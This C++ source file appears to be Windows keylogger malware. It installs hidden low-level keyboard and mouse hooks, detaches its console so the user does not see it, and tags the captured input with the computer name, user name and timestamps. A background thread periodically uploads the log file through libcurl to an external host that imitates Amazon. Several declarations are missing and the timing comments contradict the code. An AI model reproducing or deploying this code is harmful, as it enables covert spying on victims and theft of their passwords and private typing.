#include <Windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <fstream>
#include <stdio.h>

#include "include/curl/curl.h"

#pragma comment(lib, "user32.lib") // user32.dll windows' library
#pragma comment(lib,"ws2_32.lib") // ws2_32.dll windows' library

const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes


// creating the string that will be written at the beginning of the file
static std::string StartString()
{
	std::string startString = ""; // for the top of the file
	std::time_t now = std::time(nullptr);
	std::tm currentTime;
	// obtaining the PC name
	TCHAR pcname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
	// PC name
	startString = "\n------------------------------------\nNome Computer: ";
	if (GetComputerName(pcname, &pcname_len)) {
		std::string pcnameStr(pcname, pcname + pcname_len);
		startString.append(pcnameStr);
	}
	else startString.append("Impossibile ottenere il nome del computer.");
	// User Name
	startString.append("\nNome utente: ");
	TCHAR username[256];
	DWORD username_len = sizeof(username) / sizeof(username[0]);
	if (GetUserName(username, &username_len))
	{
		std::string usernameStr(username, username + username_len);
		startString.append(usernameStr);
	}
	else startString.append("Impossibile ottenere il nome utente.");
	// date & time
	localtime_s(&currentTime, &now);
	startString.append("\nDATA: ");
	std::string day = std::to_string(currentTime.tm_mday);
	std::string month = std::to_string(currentTime.tm_mon + 1);
	std::string year = std::to_string(currentTime.tm_year + 1900);
	std::string date = day.append("/").append(month).append("/").append(year);
	startString.append(date);
	startString.append("\nORA: ");
	std::string hour = std::to_string(currentTime.tm_hour);
	std::string minute = std::to_string(currentTime.tm_min);
	std::string second = std::to_string(currentTime.tm_sec);
	std::string time = hour.append(":").append(minute).append(":").append(second);
	startString.append(time);
	startString.append("\n------------------------------------\n");
	return startString;
}

// thread function
static void timeCheck() {
	std::string tmp;
	while (true) {
		// Wait 15 minutes
		std::this_thread::sleep_for(waitTime);
		tmp = contentFile;
		contentFile = "";
		std::ofstream outputFile(FilePath);
		if (outputFile.is_open()) outputFile << tmp;
		outputFile.close();

		// sending the file to the server
		CURL* curl;
		CURLcode res;
		curl_global_init(CURL_GLOBAL_ALL);
		curl = curl_easy_init();

		if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
			curl_mime* mime;
			curl_mimepart* part;
			mime = curl_mime_init(curl);
			part = curl_mime_addpart(mime);
			curl_mime_name(part, "file");
			curl_mime_filedata(part, FilePath.c_str());
			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl_mime_free(mime);
		}
		curl_global_cleanup();
		
		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
	}
}

// main function
int main()
{
	std::thread t(timeCheck); // istancing a thread

	FreeConsole(); // disconnect the console when the program is running

	contentFile = StartString(); // update content file at start

	HINSTANCE hInstance = GetModuleHandle(nullptr);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);

	if (keyboardHook == nullptr) return EXIT_FAILURE;
	if (mouseHook == nullptr) return EXIT_FAILURE;

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(mouseHook);
	UnhookWindowsHookEx(keyboardHook);

	return ERROR_SUCCESS;
}
